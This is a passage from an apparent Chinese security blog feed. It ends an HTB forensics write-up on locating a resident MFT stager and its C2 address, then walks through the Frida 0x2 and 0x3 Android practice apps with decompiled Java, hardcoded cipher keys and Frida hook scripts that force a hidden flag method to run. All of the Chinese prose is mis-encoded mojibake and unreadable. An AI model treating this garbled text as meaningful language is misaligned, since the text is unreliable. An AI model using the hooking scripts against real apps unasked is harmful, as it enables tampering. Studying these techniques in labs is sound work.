href="#è®¡ç®—-MFT-ä¸­æš‚å­˜æ–‡ä»¶çš„åå…­è¿›åˆ¶åç§»é‡" class="headerlink" title="è®¡ç®— MFT ä¸­æš‚å­˜æ–‡ä»¶çš„åå…­è¿›åˆ¶åç§»é‡"></a>è®¡ç®— MFT ä¸­æš‚å­˜æ–‡ä»¶çš„åå…­è¿›åˆ¶åç§»é‡</h1><p>æ‰¾åˆ° <code>Entry Number</code> è¿™ä¸€æ ï¼Œå¯¹åº”çš„æ–‡ä»¶ <code>.bat</code>ï¼Œ23436 ä¹˜ä»¥ 1024 ç„¶åè½¬åŒ–ä¸º 16 è¿›åˆ¶å¾—åˆ° 16E3000</p><p><img src="https://img.dkdun.cn/v1/2025/12/8ef579f989ec698c.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Task <span class="hljs-number">5</span><br>Finding <span class="hljs-keyword">the</span> hex <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">an</span> MFT record is beneficial <span class="hljs-keyword">in</span> many investigative scenarios. Find <span class="hljs-keyword">the</span> hex <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> stager <span class="hljs-built_in">file</span> <span class="hljs-built_in">from</span> Question <span class="hljs-number">3.</span><br><br>:<span class="hljs-number">16E3000</span><br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾é©»ç•™æ–‡ä»¶å†…å®¹"><a href="#æŸ¥æ‰¾é©»ç•™æ–‡ä»¶å†…å®¹" class="headerlink" title="æŸ¥æ‰¾é©»ç•™æ–‡ä»¶å†…å®¹"></a>æŸ¥æ‰¾é©»ç•™æ–‡ä»¶å†…å®¹</h1><p>æ ¹æ® â€œthey can be stored directly on MFT File itselfâ€ è¿™å¥è¯æˆ‘ä»¬ç”¨ 010 æ‰“å¼€ <code>$MFT</code> æ–‡ä»¶ï¼Œè·³è½¬åˆ°ä¹‹å‰æ‰€è®¡ç®—å‡ºæ¥çš„ <code>16E3000</code> åœ°å€å¤„ï¼Œç„¶åå¾€ä¸‹çœ‹ä¼šå‘ç°æœ‰ <code>powershell.exe</code> çš„è¸ªå½±ï¼ŒåŒæ—¶å‡ºç°äº† IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/76fe15ac4c61232d.png"></p><p>æ‰¾åˆ°ï¼š43.204.110.203:6666</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Task <span class="hljs-number">6</span><br>Each MFT record <span class="hljs-keyword">is</span> <span class="hljs-number">1024</span> bytes in size. If <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">on</span> disk <span class="hljs-built_in">has</span> smaller size than <span class="hljs-number">1024</span> bytes, they can <span class="hljs-keyword">be</span> stored directly <span class="hljs-keyword">on</span> MFT File itself. These are called MFT Resident <span class="hljs-keyword">files</span>. During Windows File <span class="hljs-built_in">system</span> Investigation, its crucial <span class="hljs-keyword">to</span> look <span class="hljs-keyword">for</span> any malicious/suspicious <span class="hljs-keyword">files</span> that may <span class="hljs-keyword">be</span> resident in MFT. This way we can <span class="hljs-keyword">find</span> contents of malicious <span class="hljs-keyword">files</span>/scripts. Find the contents of The malicious stager identified in Question3 <span class="hljs-built_in">and</span> answer with the C2 IP <span class="hljs-built_in">and</span> port.<br><br>:<span class="hljs-number">43.204</span>.<span class="hljs-number">110.203</span>:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h1 id="MFT"><a href="#MFT" class="headerlink" title="MFT"></a>MFT</h1><h2 id="MFT-ç®€ä»‹"><a href="#MFT-ç®€ä»‹" class="headerlink" title="MFT ç®€ä»‹"></a>MFT ç®€ä»‹</h2><p><strong>MFTï¼ˆ Master File Tableï¼Œä¸»æ–‡ä»¶è¡¨ï¼‰</strong>ï¼Œå®ƒæ˜¯ NTFS æ–‡ä»¶ç³»ç»Ÿçš„å…³é”®ç»„æˆéƒ¨åˆ†ï¼ŒåŒ…å«äº† å¾ˆå¤šä¿¡æ¯ï¼š</p><ul><li>æ–‡ä»¶å’Œç›®å½•çš„å±æ€§ï¼šåŒ…æ‹¬æƒé™ã€æ‰€æœ‰è€…ã€åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ã€è®¿é—®æ—¶é—´ç­‰ã€‚</li><li>æ–‡ä»¶æ•°æ®çš„ç‰©ç†ä½ç½®ï¼šMFTè®°å½•äº†æ–‡ä»¶æ•°æ®åœ¨ç£ç›˜ä¸Šçš„å­˜å‚¨ä½ç½®ã€‚</li><li>æ–‡ä»¶åï¼šMFTä¸­å­˜å‚¨äº†æ–‡ä»¶å’Œç›®å½•çš„åç§°ã€‚</li></ul><p>æ¯ä¸ªæ–‡ä»¶æˆ–ç›®å½•åœ¨ MFT ä¸­éƒ½æœ‰ä¸€ä¸ªå›ºå®šå¤§å°ï¼ˆ1024 å­—èŠ‚ï¼‰çš„è®°å½•ï¼ˆRecordï¼‰ï¼Œå…¶ä¸­åŒ…å«æ–‡ä»¶åã€æ—¶é—´æˆ³ã€å¤§å°ã€æ•°æ®ä½ç½®ç­‰ä¿¡æ¯ã€‚</p><h2 id="Entry-Number"><a href="#Entry-Number" class="headerlink" title="Entry Number"></a>Entry Number</h2><p><strong>Entry Number</strong>ï¼ˆMFT è®°å½•ç¼–å·ï¼‰ï¼Œæ˜¯ <code>$MFT</code> æ–‡ä»¶ä¸­æ¯ä¸ªæ–‡ä»¶&#x2F;ç›®å½•çš„å”¯ä¸€æ ‡è¯†ç¼–å·ï¼Œå¯ä»¥è®¡ç®—è¯¥è®°å½•åœ¨ <code>$MFT</code> æ–‡ä»¶ä¸­çš„èµ·å§‹å­—èŠ‚ä½ç½®ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶çš„ MFT çš„  Entry Number æ˜¯ <code>1000</code>ï¼Œé‚£ä¹ˆå®ƒçš„ Byte Offset è®¡ç®—å¦‚ä¸‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1000</span>Ã—<span class="hljs-number">1024</span>=<span class="hljs-number">1024000</span><br></code></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€è¯¥è®°å½•åœ¨ <code>$MFT</code> æ–‡ä»¶ä¸­çš„èµ·å§‹ä½ç½®æ˜¯ <strong>1024000 å­—èŠ‚ï¼ˆ1 MBï¼‰</strong>ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MFT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡ç”Ÿä¹‹æˆ‘è¦æˆä¸º Frida ç³•æ‰‹:Frida 0x2-Frida 0x7</title>
    <link href="/2025/03/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-0x2-Frida-0x7/"/>
    <url>/2025/03/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-0x2-Frida-0x7/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©æ—¶é—´å¤šç‚¹ï¼Œå¤šçœ‹äº†å‡ é“ï¼Œç»ˆäºè¦å‘¨æœ«äº†å˜¿å˜¿ï¼ŒJava å±‚çš„ hook ç»ƒä¹ ç»“æŸäº†ï¼Œç„¶åå°±æ˜¯ Native å±‚äº†</p><span id="more"></span><h1 id="Frida-0x2"><a href="#Frida-0x2" class="headerlink" title="Frida 0x2"></a>Frida 0x2</h1><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>è¿™æ¬¡æ²¡æœ‰è¾“å…¥ä¹Ÿæ²¡æœ‰æŒ‰é’®</p><p><img src="https://img.dkdun.cn/v1/2025/12/3b8ec63ea132fe79.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç›´æ¥åç¼–è¯‘ï¼Œä»£ç è¿˜æ˜¯æŒºç®€å•çš„ï¼Œæµç¨‹ä¹Ÿæ¸…æ™°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x2;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Base64;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">static</span> TextView t1;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> &#123;<br>        <span class="hljs-keyword">if</span>(a == <span class="hljs-number">4919</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher0</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>                <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>]);<br>                cipher0.init(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;HILLBILLWILLBINN&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>), iv);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">decryptedText</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher0.doFinal(Base64.decode(<span class="hljs-string">&quot;q7mBQegjhpfIAr0OgfLvH0t/D0Xi0ieG0vd+8ZVW+b4=&quot;</span>, <span class="hljs-number">0</span>)));<br>                MainActivity.t1.setText(decryptedText);<br>            &#125;<br>            <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-built_in">this</span>.setContentView(layout.activity_main);<br>        MainActivity.t1 = (TextView)<span class="hljs-built_in">this</span>.findViewById(id.textview);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-ç±»"><a href="#MainActivity-ç±»" class="headerlink" title="MainActivity ç±»"></a>MainActivity ç±»</h3><p><code>MainActivity</code> ç±»ä¸­æœ‰ä¸€ä¸ªé™æ€æ–¹æ³• <code>get_flag()</code> ï¼Œå¦‚æœä¼ å…¥çš„ å‚æ•° <code>a==4919</code>ï¼Œé‚£ä¹ˆå°±è§£å¯† flag è¾“å‡º</p><p><img src="https://img.dkdun.cn/v1/2025/12/a4dd2f8fd02552e1.png"></p><p>å¯ä»¥å‘ç° <code>get_flag()</code> æ–¹æ³•åœ¨ç¨‹åºä¸­å¹¶æ²¡æœ‰è¢«è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨æ³¨å…¥æ—¶å»è°ƒç”¨è¿™ä¸ªé™æ€æ–¹æ³•</p><p><img src="https://img.dkdun.cn/v1/2025/12/446e6378ec5d70d2.png"></p><p>æ–¹æ³•å°±æ˜¯ï¼šä¸»åŠ¨å»è°ƒç”¨é™æ€æ–¹æ³•</p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook2</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>å…ˆå¯åŠ¨ç¨‹åºï¼ˆå¿…é¡»ï¼‰ï¼Œç„¶åè¿›è¡Œ hookï¼Œç›´æ¥æŠŠä»£ç å†™åœ¨ç»ˆç«¯è¿è¡Œï¼Œä¿è¯åœ¨å¯åŠ¨ä¹‹åè¿è¡Œï¼Œå¦‚æœåƒä»¥å‰ä¸€æ ·åŠ ä¸Šæ–‡ä»¶æ‰§è¡Œä¼š hook ä¸åˆ°ï¼Œçœ‹åˆ° SWDD ç”¨ <code>frida -U &#39;Frida 0x2&#39; -l hook2.js</code>  å‘½ä»¤èƒ½æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘çš„ cmd å’Œ PowerShell éƒ½ä¸èƒ½è½¬ä¹‰ç©ºæ ¼ï¼Œå•å¼•å·åŒå¼•å·ä¹Ÿä¸è¡Œï¼Œç„¶åå°±è¯†åˆ«ä¸åˆ°è¿›ç¨‹åç§°ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•å®ç°ä¸äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/d5c41a54bb0558cd.png"></p><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>æ›´åŠ ç®€æ´çš„ demoï¼Œè™½ç„¶æ ¸å¿ƒä»£ç å·®ä¸å¤šä¸€æ ·ï¼Œä½†æ˜¯æ–¹æ³• 1 ä¸­å¤šäº†ä¸ª <code>setImmediate()</code> å‡½æ•°ï¼Œå®ƒä¼šæ¯”ç¨‹åºå…ˆæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ç¨‹åºè¿˜æ²¡æ‰§è¡Œä¹‹å‰å®ƒè°ƒç”¨çš„å‡½æ•°å°±å·²ç»æ‰§è¡Œå®Œäº†ï¼Œå¦‚æœæ²¡æœ‰è¿è¡Œç¨‹åºçš„è¯ï¼Œç›¸å½“äºæ²¡æœ‰ hook</p><p>æœ¬æ–¹æ³•ä¸­æ˜¯æ³¨å…¥ä¹‹åç«‹å³è°ƒç”¨æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>å…ˆæ‰“å¼€ç¨‹åºç”¨ <code>-F</code> å‘½ä»¤ç›´æ¥é™„åŠ åˆ°å½“å‰å‰å°æ­£åœ¨è¿è¡Œçš„ç¨‹åºä¸Šï¼Œç§’å‡ºç»“æœ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">frida -U -F -l hook2.js<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/df67d0a70ca92131.png"></p><h3 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h3><p>å¯¹äºæ–¹æ³• 1 çš„ <code>setImmediate(main)</code>ï¼Œè¿˜å¯ä»¥æ”¹ä¸º <code>setTimeout(main,1000)</code>ï¼Œå‚è€ƒ SWDD çš„ï¼š<a href="https://blog.shangwendada.top/index.php/2024/03/03/fridafrida%e6%93%8d%e4%bd%9c%e6%89%8b%e5%86%8c/">https://blog.shangwendada.top/index.php/2024/03/03/fridafrida%e6%93%8d%e4%bd%9c%e6%89%8b%e5%86%8c/</a></p><p>å¯¹äº <code>setImmediate</code> å’Œ <code>setTimeout</code>ï¼š<a href="https://www.cnblogs.com/fsjohnhuang/p/4151595.html">https://www.cnblogs.com/fsjohnhuang/p/4151595.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook2</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/eeb729d7f873b417.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>ä¸»è¦æ˜¯ hook è°ƒç”¨æœªè¢«æ‰§è¡Œçš„é™æ€æ–¹æ³•ï¼ŒæŒ‡å®šçš„ç±»ä¸­åŒ…å«äº†é™æ€çš„æ–¹æ³•ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•</p><p>hook æ¨¡æ¿å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(â€œ&lt;package_name&gt;.&lt;<span class="hljs-keyword">class</span>&gt;â€);<br>     &lt;class_reference&gt;.<span class="hljs-keyword">function</span>(<span class="hljs-params">val</span>); <span class="hljs-comment">// éœ€è¦è°ƒç”¨çš„æ–¹æ³•åç§°</span><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Frida-0x3"><a href="#Frida-0x3" class="headerlink" title="Frida 0x3"></a>Frida 0x3</h1><h2 id="è¿è¡Œ-1"><a href="#è¿è¡Œ-1" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>è¿™ä¸€æ¬¡æœ‰æŒ‰é’®äº†ï¼Œå¹¶ä¸”ç‚¹å‡»ä¼šå‡ºç° ã€TRY AGAINã€‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/fd1bc91eb334e1a0.png"></p><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><p>è¿˜æ˜¯åç¼–è¯‘çœ‹ Jvav ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x3;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View.OnClickListener;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-built_in">this</span>.setContentView(layout.activity_main);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">btn</span> <span class="hljs-operator">=</span> (Button)<span class="hljs-built_in">this</span>.findViewById(id.button);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView)<span class="hljs-built_in">this</span>.findViewById(id.textView);<br>        btn.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// android.view.View$OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>                <span class="hljs-type">byte</span>[] arr_b1;<br>                <span class="hljs-keyword">if</span>(Checker.code == <span class="hljs-number">0x200</span>) &#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;YOU WON!!!&quot;</span>, <span class="hljs-number">1</span>).show();<br>                    <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">KS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;glass123&quot;</span>.getBytes(), <span class="hljs-string">&quot;Blowfish&quot;</span>);<br>                    <span class="hljs-type">byte</span>[] arr_b = Base64.getDecoder().decode(<span class="hljs-string">&quot;MKxsZsY9Usw3ozXKKzTF0ymIaC8rs0AY74GnaKqkUrk=&quot;</span>);<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;Blowfish&quot;</span>);<br>                        cipher.init(<span class="hljs-number">2</span>, KS);<br>                        arr_b1 = cipher.doFinal(arr_b);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(NoSuchAlgorithmException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(NoSuchPaddingException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(IllegalBlockSizeException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(BadPaddingException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(InvalidKeyException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">decryptedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(arr_b1, Charset.forName(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                    MainActivity.<span class="hljs-built_in">this</span>.t1.setText(decryptedString);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;TRY AGAIN&quot;</span>, <span class="hljs-number">1</span>).show();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="MainActivity-ç±»-1"><a href="#MainActivity-ç±»-1" class="headerlink" title="MainActivity ç±»"></a>MainActivity 